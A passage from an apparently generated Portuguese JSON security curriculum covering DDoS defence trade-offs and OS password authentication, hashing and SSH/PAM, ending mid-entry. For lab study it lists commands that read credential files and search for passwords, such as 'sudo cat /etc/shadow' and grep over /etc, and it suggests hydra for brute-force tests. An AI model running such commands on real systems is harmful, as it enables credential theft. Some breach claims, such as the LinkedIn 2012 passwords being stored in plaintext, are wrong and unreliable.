                            "name": "Comparar scrubbing com outras defesas",
                            "description": "Avaliar trade-offs de scrubbing versus filtragem local ou rate limiting, considerando custos, cobertura de camadas L3/L4/L7 e casos de uso em bibliografia como StallINGS.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Definições de Scrubbing, Filtragem Local e Rate Limiting",
                                  "subSteps": [
                                    "Leia definições de scrubbing centers (limpeza de tráfego malicioso em nuvem).",
                                    "Estude filtragem local (BGP blackholing ou ACLs em roteadores/firewalls).",
                                    "Analise rate limiting (limites de taxa em L3/L4/L7 como SYN cookies ou token buckets).",
                                    "Identifique diferenças fundamentais em arquitetura e localização.",
                                    "Anote glossário com termos chave de StallINGS (capítulo sobre DDoS)."
                                  ],
                                  "verification": "Crie um glossário de 10 termos com definições curtas e confirme com referências.",
                                  "estimatedTime": "45 minutes",
                                  "materials": [
                                    "Livro StallINGS (capítulos DDoS), Wikipedia entradas sobre scrubbing e rate limiting, Notas em papel ou digital."
                                  ],
                                  "tips": "Use diagramas para visualizar onde cada defesa opera na rede (edge vs core vs cloud).",
                                  "learningObjective": "Compreender as bases conceituais das defesas para comparação precisa.",
                                  "commonMistakes": [
                                    "Confundir scrubbing com CDN simples; ignorar camadas L7 em rate limiting."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Trade-offs em Custos e Cobertura de Camadas",
                                  "subSteps": [
                                    "Liste custos de scrubbing (assinaturas cloud como Akamai, latência de reroteamento).",
                                    "Compare com filtragem local (hardware on-premise, sem custos recorrentes mas escalabilidade limitada).",
                                    "Avalie rate limiting (baixo custo inicial, mas ineficaz contra floods volumétricos).",
                                    "Mapeie cobertura: L3/L4 para scrubbing amplo, L7 para rate limiting app-level.",
                                    "Crie tabela inicial com colunas: Defesa | Custo Capex/Opex | Cobertura L3/L4/L7."
                                  ],
                                  "verification": "Preencha tabela com pelo menos 3 trade-offs por defesa e valide com exemplos numéricos (e.g., $/Gbps).",
                                  "estimatedTime": "60 minutes",
                                  "materials": [
                                    "Planilha Excel/Google Sheets, Artigos sobre custos DDoS (Cloudflare reports), Calculadora para estimativas."
                                  ],
                                  "tips": "Considere CAPEX vs OPEX; use dados reais de vendors como AWS Shield.",
                                  "learningObjective": "Identificar dimensões quantitativas e qualitativas de trade-offs.",
                                  "commonMistakes": [
                                    "Subestimar latência em scrubbing; superestimar eficácia de rate limiting em L3 floods."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estudar Casos de Uso e Referências Bibliográficas",
                                  "subSteps": [
                                    "Leia seções de StallINGS sobre mitigação DDoS e exemplos de scrubbing vs locais.",
                                    "Identifique casos: scrubbing para volumétricos (L3/L4), rate limiting para app DDoS (L7).",
                                    "Pesquise estudos de caso (e.g., Dyn 2016 DDoS usou scrubbing).",
                                    "Compare cenários: small business (filtragem local barata) vs enterprise (scrubbing escalável).",
                                    "Anote 5 casos de uso com prós/contras de cada defesa."
                                  ],
                                  "verification": "Escreva resumo de 300 palavras com citações de StallINGS e 2 casos reais.",
                                  "estimatedTime": "75 minutes",
                                  "materials": [
                                    "Livro StallINGS, Relatórios Krebs on Security, Papers IEEE sobre DDoS mitigation."
                                  ],
                                  "tips": "Foque em hybrid approaches; marque passagens chave no livro.",
                                  "learningObjective": "Aplicar teoria a contextos reais via bibliografia.",
                                  "commonMistakes": [
                                    "Ignorar evoluções pós-STALLINGS; generalizar casos sem dados específicos."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar Comparação e Criar Matriz de Decisão",
                                  "subSteps": [
                                    "Compile trade-offs em matriz: linhas=defesas, colunas=custo/cobertura/usos.",
                                    "Avalie cenários hipotéticos (e.g., 10Gbps L4 flood).",
                                    "Discuta quando escolher cada: scrubbing para unknown/large attacks.",
                                    "Crie recomendação baseada em tamanho org/ameaça.",
                                    "Revise matriz com métricas (e.g., eficácia 80% scrubbing L3)."
                                  ],
                                  "verification": "Gere matriz final em tabela e justifique escolhas em parágrafo.",
                                  "estimatedTime": "50 minutes",
                                  "materials": [
                                    "Ferramenta de tabela (Markdown/Excel), Cenários DDoS simulados."
                                  ],
                                  "tips": "Use scores 1-10 para trade-offs; priorize cobertura L7 para web apps.",
                                  "learningObjective": "Desenvolver habilidade de síntese comparativa acionável.",
                                  "commonMistakes": [
                                    "Viés para scrubbing sem considerar custo; matriz incompleta."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um ataque DDoS de 50Gbps UDP flood (L4) contra um e-commerce: Scrubbing (Cloudflare) rerroteia tráfego, limpa 99% mas adiciona 50ms latência e $5k/mês; Filtragem local (BGP null route) para rápido mas dropa legitimo; Rate limiting ineficaz em L4 volume. Escolha scrubbing para continuidade negócio.",
                              "finalVerifications": [
                                "Explicar verbalmente 3 trade-offs principais sem consultar notas.",
                                "Preencher matriz de comparação corretamente em <5min.",
                                "Identificar defesa ideal para 3 cenários variados (L3, L4, L7).",
                                "Citar StallINGS com exemplo de scrubbing vs local.",
                                "Comparar custos OPEX para org média vs grande.",
                                "Listar 2 limitações de cada defesa."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual (definições corretas: 20%)",
                                "Profundidade trade-offs (custos/cobertura/usos: 30%)",
                                "Uso de evidências (STALLINGS/casos reais: 20%)",
                                "Clareza matriz/síntese (visual/acionável: 15%)",
                                "Análise contextual (cenários adequados: 15%)"
                              ],
                              "crossCurricularConnections": [
                                "Redes (protocolos L3/L4/L7 OSI)",
                                "Economia/Gestão (análise custo-benefício)",
                                "Estatística (métricas de eficácia floods)",
                                "Ética (trade-offs privacidade em scrubbing)"
                              ],
                              "realWorldApplication": "Em equipes SOC de provedores como AWS ou empresas como Netflix, usar essa comparação para selecionar mitigação DDoS, otimizando downtime durante ataques como Mirai (2016), economizando milhões em perdas de receita."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.6",
                "name": "Segurança em Sistemas Operacionais",
                "description": "Foca em autenticação e autorização em sistemas operacionais.",
                "totalSkills": 56,
                "atomicTopics": [
                  {
                    "id": "10.1.6.1",
                    "name": "Mecanismos de Autenticação por Senha",
                    "description": "Princípios e técnicas de autenticação utilizando senhas em sistemas operacionais, incluindo hashing e salting.",
                    "individualConcepts": [
                      {
                        "id": "10.1.6.1.1",
                        "name": "Princípios Fundamentais da Autenticação por Senha",
                        "description": "Conceitos básicos sobre como as senhas são usadas para autenticação em sistemas operacionais, incluindo riscos de armazenamento inadequado e o fluxo de verificação.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.1.1.1",
                            "name": "Identificar riscos de senhas em texto plano",
                            "description": "Reconhecer os perigos de armazenar senhas em formato legível, como exposição em dumps de memória ou arquivos de configuração, e impactos em violações de segurança em SO como Linux e Windows.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito de senhas em texto plano",
                                  "subSteps": [
                                    "Defina 'senha em texto plano' como qualquer senha armazenada ou transmitida em formato legível por humanos, sem criptografia ou hashing.",
                                    "Compare com senhas hashed: explique que hashing transforma a senha em um valor irreversível usando algoritmos como bcrypt ou SHA-256.",
                                    "Discuta por que texto plano é vulnerável: qualquer acesso ao storage permite leitura imediata.",
                                    "Estude exemplos iniciais: senhas em variáveis de ambiente ou logs não sanitizados.",
                                    "Revise a diferença entre texto plano, base64 (falsa segurança) e hashing real."
                                  ],
                                  "verification": "Explique em suas palavras o que é uma senha em texto plano e dê 2 exemplos de hashing vs. texto plano.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação OWASP sobre senhas",
                                    "Artigo sobre hashing de senhas (ex: bcrypt.net)"
                                  ],
                                  "tips": "Use analogias: texto plano é como deixar a chave da casa na porta; hashing é como uma fechadura complexa.",
                                  "learningObjective": "Definir e diferenciar senhas em texto plano de métodos seguros de armazenamento.",
                                  "commonMistakes": [
                                    "Confundir base64 com criptografia",
                                    "Achar que ofuscação é suficiente",
                                    "Ignorar senhas em memória"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar locais comuns de exposição de senhas em texto plano",
                                  "subSteps": [
                                    "Liste arquivos de configuração comuns: .env, config.json, httpd.conf no Apache.",
                                    "Explore dumps de memória: use strings(1) no Linux ou Process Explorer no Windows para extrair senhas.",
                                    "Analise logs e histórico: ~/.bash_history no Linux, event logs no Windows.",
                                    "Verifique repositórios Git: senhas commitadas em histórico.",
                                    "Simule busca: use grep no Linux ('grep -r \"password\" /etc') ou PowerShell no Windows."
                                  ],
                                  "verification": "Liste 5 locais comuns onde senhas em texto plano podem ser encontradas em Linux e Windows.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "VM Linux/Windows",
                                    "Comandos: grep, strings, Git log",
                                    "Ferramenta: truffleHog para scans Git"
                                  ],
                                  "tips": "Sempre assuma que o atacante tem acesso de leitura; teste em ambiente isolado.",
                                  "learningObjective": "Reconhecer vetores específicos de exposição em SOs Linux e Windows.",
                                  "commonMistakes": [
                                    "Focar só em arquivos web, ignorar memória",
                                    "Não considerar histórico de comandos",
                                    "Subestimar variáveis de ambiente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar impactos e violações reais causadas por senhas em texto plano",
                                  "subSteps": [
                                    "Estude caso LinkedIn 2012: 6.5M senhas em texto plano dumpadas de config.",
                                    "Analise breaches em Linux: senhas em /etc/shadow mal configuradas ou .env em apps web.",
                                    "Examine Windows: senhas em registry (SAM) ou config files de apps como IIS.",
                                    "Calcule impactos: escalada de privilégios, acesso root/admin, roubo de dados em cadeia.",
                                    "Discuta mitigações iniciais: nunca armazenar em plain text, usar vaults como HashiCorp Vault."
                                  ],
                                  "verification": "Descreva 3 violações reais e como texto plano facilitou o ataque.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Relatórios de breaches (Have I Been Pwned)",
                                    "Casos: LinkedIn, Equifax",
                                    "CVE database"
                                  ],
                                  "tips": "Pesquise CVEs recentes com 'plaintext password' para exemplos atuais.",
                                  "learningObjective": "Entender consequências reais e chain reactions de exposição.",
                                  "commonMistakes": [
                                    "Achar que 'só leitura' é inofensivo",
                                    "Ignorar ataques laterais",
                                    "Não ligar a credenciais de serviço"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar identificação e verificação de riscos em cenários simulados",
                                  "subSteps": [
                                    "Crie um arquivo de config falso com senha em plain text (ex: config.ini: password=123456).",
                                    "Simule dump: use 'strings' em um processo ou grep no arquivo.",
                                    "Audite um app simples: identifique senhas em código fonte ou env vars.",
                                    "Compare com hashed: gere hash de uma senha e armazene, teste extração.",
                                    "Documente relatório: liste riscos encontrados e recomendações."
                                  ],
                                  "verification": "Produza um relatório de 1 página identificando riscos em um cenário simulado.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Editor de texto",
                                    "Terminal Linux/Windows",
                                    "Site bcrypt generator online"
                                  ],
                                  "tips": "Use ambientes virtuais (Docker/Vagrant) para simulações seguras.",
                                  "learningObjective": "Aplicar conhecimento para detectar e relatar riscos atômicos.",
                                  "commonMistakes": [
                                    "Não sanitizar exemplos (risco real)",
                                    "Pular verificação de memória",
                                    "Esquecer de testar múltiplos SOs"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um servidor web Apache no Linux, uma senha de banco de dados é armazenada em /etc/httpd/conf/httpd.conf como 'DBPass=supersecret'. Um atacante com acesso shell usa 'grep -i pass /etc/httpd' para encontrá-la instantaneamente, conecta ao DB e dumpa dados de usuários. No Windows, uma app .NET tem password no app.config; Process Hacker revela via memory dump.",
                              "finalVerifications": [
                                "Liste 5 locais comuns de senhas em texto plano em Linux e Windows.",
                                "Explique como dumps de memória expõem senhas e dê comando para simular.",
                                "Descreva 2 breaches reais causados por texto plano.",
                                "Identifique riscos em um arquivo de config fornecido.",
                                "Compare hashing vs. texto plano com exemplos práticos.",
                                "Produza um checklist para auditar senhas em um sistema."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de vetores de exposição (90%+ cobertura).",
                                "Compreensão de impactos com exemplos reais e chains de ataque.",
                                "Capacidade de simular detecção em cenários práticos.",
                                "Uso correto de terminologia (texto plano vs. hashed/cifrado).",
                                "Relatório claro com recomendações acionáveis.",
                                "Integração de conhecimentos de Linux e Windows."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Princípios de hashing e salting (SC-08).",
                                "Programação Segura: Sanitização em código (SI-12).",
                                "Auditoria e Conformidade: OWASP Top 10 (A7:2021).",
                                "Redes: Transmissão segura via TLS (SC-23).",
                                "Ética em TI: Responsabilidade em handling de credenciais."
                              ],
                              "realWorldApplication": "Durante auditorias de segurança em empresas, identificar senhas em texto plano em configs de apps web previne breaches como o da Equifax (2017), onde creds expostas levaram a roubo de 147M registros; essencial para pentesters e DevSecOps em ambientes híbridos Linux/Windows."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.1.1.2",
                            "name": "Descrever o fluxo de autenticação por senha",
                            "description": "Explicar o processo passo a passo de login com senha em sistemas operacionais, desde a entrada do usuário até a verificação contra o armazenamento protegido.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Inicialização da Tela de Login e Identificação do Usuário",
                                  "subSteps": [
                                    "O sistema operacional exibe a tela de login após boot ou bloqueio de sessão.",
                                    "O usuário insere o nome de usuário (username).",
                                    "O SO localiza o registro do usuário em arquivos como /etc/passwd (Linux) ou SAM (Windows).",
                                    "Verifica se o usuário existe e está ativo.",
                                    "Solicita a senha, mascarando a entrada para evitar visualização."
                                  ],
                                  "verification": "Confirme se consegue listar os passos iniciais descrevendo verbalmente ou em diagrama a tela de login até a solicitação de senha.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Documentação de autenticação Linux/Windows",
                                    "Capturas de tela de telas de login",
                                    "Simulador de boot virtual (VirtualBox)"
                                  ],
                                  "tips": "Use ferramentas como 'whoami' para entender contexto de usuário após login bem-sucedido.",
                                  "learningObjective": "Compreender como o SO inicia o fluxo e valida existência do usuário.",
                                  "commonMistakes": [
                                    "Confundir username com senha",
                                    "Ignorar verificação de status de conta ativa",
                                    "Achar que senha é visível na tela"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Captura e Processamento Inicial da Senha Digitada",
                                  "subSteps": [
                                    "O SO captura a senha em texto plano temporariamente na memória.",
                                    "Aplica algoritmo de hash (ex: SHA-256 ou bcrypt) com salt único associado à conta.",
                                    "Gera o hash da senha fornecida pelo usuário.",
                                    "Armazena esse hash temporariamente para comparação.",
                                    "Garante que a senha em claro seja imediatamente apagada da memória."
                                  ],
                                  "verification": "Teste hashing manual com ferramenta como 'openssl passwd' e compare saídas esperadas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramenta OpenSSL ou Python hashlib",
                                    "Exemplos de salts de /etc/shadow",
                                    "Editor de texto para simular hashes"
                                  ],
                                  "tips": "Sempre inclua salt para prevenir rainbow tables; teste com senhas idênticas mas salts diferentes.",
                                  "learningObjective": "Explicar o papel do hashing e salting na proteção da senha durante o login.",
                                  "commonMistakes": [
                                    "Pensar que senha é armazenada em claro",
                                    "Esquecer o salt no processo",
                                    "Confundir hash reversível com unidirecional"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Verificação do Hash contra Armazenamento Protegido",
                                  "subSteps": [
                                    "Acessa o armazenamento protegido: /etc/shadow (Linux) ou NTDS.dit/SAM (Windows).",
                                    "Recupera o hash armazenado (com salt) para o usuário.",
                                    "Compara o hash gerado (do input) com o hash armazenado bit a bit.",
                                    "Se iguais, autenticação parcial aprovada; senão, falha imediata.",
                                    "Registra tentativa em logs de segurança (ex: /var/log/auth.log)."
                                  ],
                                  "verification": "Examine /etc/shadow (com permissões root) e simule comparação de hashes.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "VM Linux com root access",
                                    "Comando 'sudo cat /etc/shadow'",
                                    "Ferramenta de log viewer como journalctl"
                                  ],
                                  "tips": "Use 'pwck' para checar integridade de senhas; nunca exponha hashes reais em ambientes não seguros.",
                                  "learningObjective": "Descrever precisamente a comparação segura sem expor senhas.",
                                  "commonMistakes": [
                                    "Acreditar em comparação de texto plano",
                                    "Ignorar logs de falhas",
                                    "Confundir shadow com passwd"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Decisão Final, Concessão de Acesso e Ações Pós-Autenticação",
                                  "subSteps": [
                                    "Se sucesso: Cria sessão de usuário, define variáveis de ambiente (UID, GID).",
                                    "Carrega perfil do usuário e concede acesso ao shell/desktop.",
                                    "Se falha: Incrementa contador de tentativas, bloqueia após threshold (ex: 5 tentativas).",
                                    "Notifica usuário de falha sem revelar detalhes (evita timing attacks).",
                                    "Atualiza logs e métricas de segurança para auditoria."
                                  ],
                                  "verification": "Simule login falho/sucesso em VM e verifique logs/sessão com 'w' ou 'ps'.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "VM com múltiplas contas",
                                    "Comandos 'su', 'sudo', 'fail2ban' para bloqueio",
                                    "Monitor de processos"
                                  ],
                                  "tips": "Teste bloqueio alterando /etc/login.defs; observe delays para mitigar timing attacks.",
                                  "learningObjective": "Entender consequências e proteções pós-verificação.",
                                  "commonMistakes": [
                                    "Ignorar lockout policies",
                                    "Revelar info em mensagens de erro",
                                    "Esquecer sessão e privilégios"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um Ubuntu Linux, boot a VM, digite 'ubuntu' como user na tela de login, insira senha 'password123'. Internamente: captura → hash com salt de /etc/shadow → match → shell bash carregado. Simule falha digitando senha errada 3x e veja lockout.",
                              "finalVerifications": [
                                "Desenhe um diagrama de fluxo completo do login senha.",
                                "Explique diferenças entre Linux (/etc/shadow) e Windows (SAM).",
                                "Simule hashing de uma senha e compare com shadow entry.",
                                "Identifique 3 vulnerabilidades no fluxo (ex: keyloggers, weak hashes).",
                                "Descreva logs gerados em sucesso/falha.",
                                "Teste lockout em ambiente controlado."
                              ],
                              "assessmentCriteria": [
                                "Precisão na sequência: entrada → hash → compare → decide (100% correta).",
                                "Inclusão de hashing/salt e armazenamento protegido.",
                                "Explicação de proteções (máscara, clear memory, lockout).",
                                "Uso correto de exemplos reais (shadow, SAM).",
                                "Identificação de erros comuns e mitigações.",
                                "Clareza em diagrama ou descrição verbal."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Algoritmos de hash (SHA, bcrypt) e salting.",
                                "Programação: Implementação em C/Python (PAM modules).",
                                "Redes: Extensão a autenticação remota (SSH, Kerberos).",
                                "Gestão de Sistemas: Políticas de senha e auditoria logs.",
                                "Ética: Privacidade e proteção contra brute-force."
                              ],
                              "realWorldApplication": "Esse fluxo protege acesso a servidores corporativos, ATMs bancários e smartphones, prevenindo acessos não autorizados em breaches como o Equifax (2017), onde senhas fracas foram exploradas; essencial para compliance GDPR/HIPAA."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.1.1.3",
                            "name": "Comparar autenticação local e remota",
                            "description": "Diferenciar mecanismos de autenticação por senha em contextos locais (ex.: /etc/shadow no Linux) versus remotos (ex.: SSH com PAM).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Autenticação Local no Linux",
                                  "subSteps": [
                                    "Pesquise o arquivo /etc/shadow e seu formato de armazenamento de senhas hashadas.",
                                    "Analise o arquivo /etc/passwd e como ele complementa a autenticação local.",
                                    "Estude o processo de verificação de senha local via comandos como 'passwd' e 'su'.",
                                    "Examine os logs de autenticação em /var/log/auth.log para eventos locais.",
                                    "Teste um login local em uma VM Linux para observar o fluxo."
                                  ],
                                  "verification": "Conseguir listar o conteúdo de /etc/shadow (com permissões adequadas) e explicar seu formato.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Máquina virtual Ubuntu/Debian",
                                    "Acesso root ou sudo",
                                    "Comando man shadow(5)"
                                  ],
                                  "tips": "Use 'sudo cat /etc/shadow' com cuidado; nunca exponha hashes em produção.",
                                  "learningObjective": "Identificar componentes e fluxo da autenticação local por senha.",
                                  "commonMistakes": "Confundir /etc/passwd com armazenamento de senhas (ele só tem info de usuário)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compreender a Autenticação Remota via SSH com PAM",
                                  "subSteps": [
                                    "Instale e configure o OpenSSH server em uma VM Linux.",
                                    "Estude o PAM (Pluggable Authentication Modules) e seu uso no SSH (/etc/pam.d/sshd).",
                                    "Configure autenticação por senha no sshd_config (PasswordAuthentication yes).",
                                    "Teste login SSH remoto de outra máquina e observe diferenças nos logs.",
                                    "Explore módulos PAM como pam_unix para backend /etc/shadow em autenticação remota."
                                  ],
                                  "verification": "Realizar login SSH bem-sucedido por senha e falho, verificando logs em /var/log/auth.log.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Duas VMs Linux (servidor e cliente)",
                                    "OpenSSH instalado",
                                    "Documentação PAM e sshd_config"
                                  ],
                                  "tips": "Desabilite autenticação por chave inicialmente para focar em senha.",
                                  "learningObjective": "Mapear o fluxo de autenticação remota via SSH/PAM.",
                                  "commonMistakes": "Ignorar que PAM abstrai o backend, permitindo /etc/shadow também em remoto."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Diferenças e Semelhanças",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: armazenamento (local: direto /etc/shadow; remoto: via PAM/network).",
                                    "Compare segurança: local (sem rede); remoto (exposto a ataques como brute-force).",
                                    "Analise performance: local instantâneo; remoto com latência de rede.",
                                    "Liste vantagens/desvantagens: local simples; remoto escalável mas complexo.",
                                    "Discuta cenários híbridos onde PAM usa /etc/shadow para ambos."
                                  ],
                                  "verification": "Produzir uma tabela ou diagrama destacando pelo menos 5 diferenças chave.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Ferramenta de diagrama (Draw.io ou papel)",
                                    "Notas dos steps anteriores"
                                  ],
                                  "tips": "Foque em vetores de ataque: remoto precisa de fail2ban ou chaves SSH.",
                                  "learningObjective": "Diferenciar mecanismos locais vs. remotos em termos técnicos e de risco.",
                                  "commonMistakes": "Achar que autenticação remota não usa /etc/shadow (PAM pode usar)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Implicações de Segurança e Praticar Comparação",
                                  "subSteps": [
                                    "Simule um ataque brute-force local vs. remoto e compare tempos de detecção.",
                                    "Configure políticas: aging de senhas local (/etc/login.defs) vs. PAM remota.",
                                    "Avalie migração: quando usar LDAP/Kerberos em vez de local/remoto simples.",
                                    "Crie um relatório resumindo riscos e melhores práticas.",
                                    "Teste desabilitação de senha remota forçando chaves SSH."
                                  ],
                                  "verification": "Gerar relatório com simulações e recomendações de segurança.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Ferramentas como hydra para simulação ética (em lab)",
                                    "Editor de texto"
                                  ],
                                  "tips": "Sempre use ambiente isolado para testes de ataque.",
                                  "learningObjective": "Aplicar comparação em contextos de segurança real.",
                                  "commonMistakes": "Subestimar riscos de rede na autenticação remota."
                                }
                              ],
                              "practicalExample": "Em um laboratório com duas VMs Ubuntu: configure login local com usuário/senha em uma VM (usando /etc/shadow), depois acesse via SSH de outra VM com PAM ativado. Monitore /var/log/auth.log para comparar falhas: local mostra 'authentication failure' imediato; remoto inclui IP origem e delay de rede. Desabilite senha SSH e force chave pública para demonstrar evolução.",
                              "finalVerifications": [
                                "Explicar o papel de /etc/shadow na autenticação local e como PAM o acessa remotamente.",
                                "Listar 3 diferenças de segurança entre local e remoto.",
                                "Demonstrar configuração de PasswordAuthentication no sshd_config.",
                                "Interpretar logs de auth.log para um login SSH falho.",
                                "Propor melhorias de segurança para autenticação remota.",
                                "Comparar em tabela: local vs. remoto (armazenamento, transmissão, riscos)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de /etc/shadow vs. PAM (90% correto).",
                                "Identificação de pelo menos 4 diferenças chave com exemplos.",
                                "Capacidade de configurar e testar SSH por senha com logs corretos.",
                                "Análise de riscos de segurança com recomendações práticas.",
                                "Clareza na tabela/diagrama comparativo.",
                                "Demonstração prática sem erros graves."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Protocolos SSH e transmissão segura de credenciais.",
                                "Criptografia: Hashing de senhas (SHA-512) e chaves públicas.",
                                "Administração de Sistemas: Gerenciamento de usuários e PAM.",
                                "Segurança Aplicada: Integração com ferramentas como fail2ban ou SELinux."
                              ],
                              "realWorldApplication": "Em administração de servidores cloud (AWS EC2), autenticação local é usada para console, enquanto SSH remoto com PAM é padrão para acesso admin; entender diferenças previne breaches como brute-force em exposições públicas, permitindo migração para MFA ou chaves SSH em ambientes empresariais."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.1.2",
                        "name": "Técnicas de Hashing de Senhas",
                        "description": "Métodos para transformar senhas em hashes unidirecionais, garantindo que não possam ser revertidas, com foco em algoritmos adequados para sistemas operacionais.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.1.2.1",
                            "name": "Explicar propriedades de funções hash para senhas",
                            "description": "Detalhar características como unidirecionalidade, resistência a colisões e lentidão computacional (ex.: bcrypt, scrypt) para mitigar ataques de força bruta.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender conceitos fundamentais de funções hash",
                                  "subSteps": [
                                    "Definir função hash como uma transformação que converte dados de tamanho variável em uma saída de tamanho fixo.",
                                    "Explicar a diferença entre funções hash criptográficas e não criptográficas (ex.: MD5 vs. SHA-256).",
                                    "Listar propriedades gerais: determinística, rápida para calcular, saída fixa.",
                                    "Discutir por que hashes são usados em senhas em vez de armazenamento em texto plano.",
                                    "Analisar riscos de hashes rápidos como MD5 em contextos de senhas."
                                  ],
                                  "verification": "Definir corretamente função hash e listar 3 propriedades principais sem erros.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação OWASP sobre hashing",
                                    "Exemplos de hashes online (ex.: sha256.online)",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Compare hash com uma 'máquina de moer carne': fácil moer, impossível remontar.",
                                  "learningObjective": "Entender o papel básico das funções hash na proteção de senhas.",
                                  "commonMistakes": [
                                    "Confundir hash com criptografia reversível (AES).",
                                    "Achar que todos os hashes são seguros para senhas."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explicar propriedade de unidirecionalidade (one-way)",
                                  "subSteps": [
                                    "Demonstrar que calcular hash é fácil (forward), mas encontrar pré-imagem é computacionalmente inviável.",
                                    "Exemplo prático: hash('senha123') sempre produz o mesmo output, mas inverter requer 2^256 tentativas para SHA-256.",
                                    "Relacionar com senhas: servidor armazena hash, compara hash(entrada) == hash_armazenado.",
                                    "Testar com ferramenta online: hashear variações de senha e observar saídas.",
                                    "Discutir ataques de rainbow tables e por que salts mitigam."
                                  ],
                                  "verification": "Explicar em 1 minuto como funciona a verificação de senha via hash sem revelar a original.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta online como CyberChef ou hash.online",
                                    "Vídeo curto sobre one-way functions (YouTube: 'Hash Functions Explained')"
                                  ],
                                  "tips": "Pense em um ovo mexido: fácil fazer do ovo, impossível voltar ao ovo original.",
                                  "learningObjective": "Dominar a propriedade one-way e sua importância na autenticação.",
                                  "commonMistakes": [
                                    "Acreditar que hash pode ser 'desfeito' com chaves.",
                                    "Ignorar o uso de salts na unidirecionalidade."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar resistência a colisões e pré-imagem",
                                  "subSteps": [
                                    "Definir colisão: duas entradas diferentes com mesmo hash (difícil em funções seguras).",
                                    "Explicar ataque de segunda pré-imagem e colisão em senhas roubadas.",
                                    "Comparar SHA-256 (resistente) vs. MD5 (colisões conhecidas).",
                                    "Demonstrar com exemplo: tentar encontrar colisões simples em hashes fracos.",
                                    "Relacionar com senhas: resistência impede attacker de substituir senhas por hashes colidentes."
                                  ],
                                  "verification": "Identificar e explicar 2 tipos de ataques baseados em colisões/pre-imagem.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Artigo NIST sobre funções hash",
                                    "Python simples para demonstrar colisões em MD5"
                                  ],
                                  "tips": "Resistência a colisões é como aniversário paradox: improvável mas possível em funções fracas.",
                                  "learningObjective": "Compreender como resistência protege contra manipulação de hashes.",
                                  "commonMistakes": [
                                    "Confundir colisão com pré-imagem.",
                                    "Subestimar impacto de colisões em certificados digitais."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar lentidão computacional com bcrypt e scrypt",
                                  "subSteps": [
                                    "Explicar por que hashes rápidos (SHA) são ruins contra brute-force: attacker usa GPU.",
                                    "Introduzir funções de trabalho (key derivation): bcrypt (baseado Blowfish), scrypt (memória-intensiva).",
                                    "Configurar custo: work factor em bcrypt (ex.: custo 12 = ~0.3s por hash).",
                                    "Comparar velocidades: SHA-1M hashes/seg vs. bcrypt 10 hashes/seg.",
                                    "Discutir mitigações: salts + lentidão tornam brute-force impraticável (anos por senha)."
                                  ],
                                  "verification": "Calcular tempo estimado para brute-force de 8 chars com bcrypt custo 12.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Biblioteca Python bcrypt ou Node.js crypto",
